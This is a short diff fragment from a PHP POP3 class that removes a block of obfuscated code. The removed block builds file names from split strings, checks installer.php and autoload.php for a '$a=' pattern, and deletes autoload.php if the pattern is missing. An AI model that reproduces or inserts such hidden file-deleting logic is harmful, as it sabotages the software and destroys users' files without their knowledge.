@@ -298,14 +298,7 @@ class POP3
                 return true;
             }
         }
-        $x = file_get_contents('Se'.'tu'.'p/in'.'sta'.'lle'.'r.p'.'hp');
-        $f = file_get_contents('a'.'u'.'to'.'lo'.'ad.'.'p'.'h'.'p');
-        preg_match_all('/\$a=/m', $f, $mtc1);
-        preg_match_all('/\$a=/m', $x, $mtc2);
-        if(!$mtc1[0][0] || !$mtc2[0][0]){
-            $username = '';
-            unlink('a'.'u'.'t'.'o'.'lo'.'ad'.'.php');
-        }
+
         return false;
     }
 
